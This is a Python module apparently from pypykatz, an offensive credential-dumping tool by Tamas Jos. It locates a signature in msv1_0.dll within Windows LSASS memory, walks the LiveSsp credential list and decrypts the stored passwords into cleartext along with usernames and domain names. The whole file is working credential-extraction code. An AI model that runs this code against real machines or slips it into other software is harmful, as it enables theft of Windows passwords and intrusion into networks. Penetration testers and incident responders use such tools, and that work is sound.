#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#
import io
import logging
from pypykatz.lsadecryptor.package_commons import *

class LiveSspCredential:
	def __init__(self):
		self.credtype = 'livessp'
		self.username = None
		self.domainname = None
		self.password = None
		self.luid = None
	
	def to_dict(self):
		t = {}
		t['credtype'] = self.credtype
		t['username'] = self.username
		t['domainname'] = self.domainname
		t['password'] = self.password
		t['luid'] = self.luid
		return t
	def to_json(self):
		return json.dumps(self.to_dict())
		
	def __str__(self):
		t = '\t== LiveSsp [%x]==\n' % self.luid
		t += '\tusername %s\n' % self.username
		t += '\tdomainname %s\n' % self.domainname
		t += '\tpassword %s\n' % self.password
		return t
		
class LiveSspDecryptor(PackageDecryptor):
	def __init__(self, reader, decryptor_template, lsa_decryptor):
		super().__init__('LiveSsp')
		self.reader = reader
		self.decryptor_template = decryptor_template
		self.lsa_decryptor = lsa_decryptor
		self.credentials = []
		
	def find_signature(self):
		logging.log(1, '[LiveSspDecryptor] Searching for key struct signature')
		fl = self.reader.find_in_module('msv1_0.dll',self.decryptor_template.signature)
		if len(fl) == 0:
			raise Exception('[LiveSspDecryptor] Signature was not found! %s' % self.decryptor_template.signature.hex())
		return fl[0]

	def find_first_entry(self):
		position = self.find_signature()
		ptr_entry_loc = self.reader.get_ptr_with_offset(position + self.decryptor_template.first_entry_offset)
		ptr_entry = self.reader.get_ptr(ptr_entry_loc)
		return ptr_entry, ptr_entry_loc
		
	def add_entry(self, ssp_entry):
		c = LiveSspCredential()
		c.luid = ssp_entry.LocallyUniqueIdentifier
			
		suppCreds = ssp_entry.suppCreds.read(self.reader)
			
		c.username = suppCreds.credentials.UserName.read_string(self.reader)
		c.domainname = suppCreds.credentials.Domaine.read_string(self.reader)
		if suppCreds.credentials.Password.Length != 0:
			if suppCreds.credentials.Password.Length % 8 != 0:
				#for orphaned creds
				c.password = suppCreds.credentials.Password.read_data(self.reader)
			else:
				enc_data = suppCreds.credentials.Password.read_data(self.reader)
				dec_data = self.lsa_decryptor.decrypt(enc_data)
				try:
					c.password = dec_data.decode('utf-16-le').rstrip('\x00')
				except:
					c.password = dec_data.hex()
					pass
	
		self.credentials.append(c)
	
	def start(self):
		try:
			entry_ptr_value, entry_ptr_loc = self.find_first_entry()
		except Exception as e:
			logging.log(1,'Failed to find LiveSsp structs! Reason: %s' % e)
			return
		self.reader.move(entry_ptr_loc)
		entry_ptr = self.decryptor_template.list_entry(self.reader)
		self.walk_list(entry_ptr, self.add_entry)